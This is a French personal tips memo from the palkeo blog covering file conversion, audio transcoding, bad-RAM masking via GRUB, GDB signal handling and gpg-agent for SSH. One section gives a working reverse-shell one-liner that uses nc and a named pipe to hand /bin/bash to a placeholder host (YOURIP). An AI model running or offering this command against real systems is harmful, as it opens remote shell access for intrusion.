# Memo with various tips [fr]¶

## Conversion¶

>   * Pour convertir un BIN, MDF, PDI, CDI, NRG et B5I, en ISO : `iat`
>
>   * Remplacements dans tous les fichiers sources d’un répertoire :
>  
>     >     find . -name "*.py" -print | xargs sed -i
> 's/recherche/remplacement/g
>  
>
>   * Transcodage ogg vers mp3 :
>  
>     >     for i in *.ogg; do sox -S "$i" "${i%.ogg}.mp3"; done
>  
>
>   * Transcodage mp3 vers ogg :
>  
>     >     mpg123 -w - fichier.mp3 | oggenc -q0 -o fichier.ogg -
>  
>
>

## Ram défectueuse¶

Warning

D’expérience, c’est une mauvaise idée car votre RAM est en train de mourir, et
sera vite défectueuse un peu partout.

Si une zone de la ram est défectueuse avec memtest (et seulement une zone
précise !), il suffit de modifier la configuration de GRUB en ajoutant par
exemple, aux paramètres de boot passés à Linux :

    
    
    memmap=2M\$722M
    

Ici, le 2M est la taille de la zone à bannir, et 722M le début de la zone à
bannir.

Le backslash avant le dollar est nécessaire car ce dernier est un caractère
spécial pour GRUB.

## GDB¶

Empêcher GDB d’arrêter le programme si il reçoit un SIGPIPE :

    
    
    handle SIGPIPE nostop noprint pass
    

## Reverse shell¶

Pour ouvrir un reverse shell :

    
    
    mknod /tmp/bp p && nc YOURIP 8080 0</tmp/bp | /bin/bash 1>/tmp/bp
    

## Utiliser gpg-agent comme agent SSH¶

Assurez-vous que votre gpg-agent est bien configuré pour faire aussi agent
SSH, puis, rajoutez ceci dans votre `.(bash|zsh)rc` :

    
    
    export SSH_AUTH_SOCK=~/.gnupg/S.gpg-agent.ssh
    gpgconf --launch gpg-agent
    

GPG utilise tout le temps le même socket, mais il faut lancer l’agent à la
main pour qu’il puisse être utilisé par SSH.

Previous: [ Neo4j tips : starting & optimizing ](neo4j.html)   Next: [ Static
IPv6 with Online.net [fr] ](online.html)

### [palkeo](../index.html)

  * [Projects](../projets/index.html)
  * [Blog articles](index.html)
  * [Links](http://links.palkeo.com)
  * [Repository](http://repo.palkeo.com/)
  * [About](../about.html)

##  06 December 2015

  * Language: [French](language/french.html)

(C)2020, palkeo.

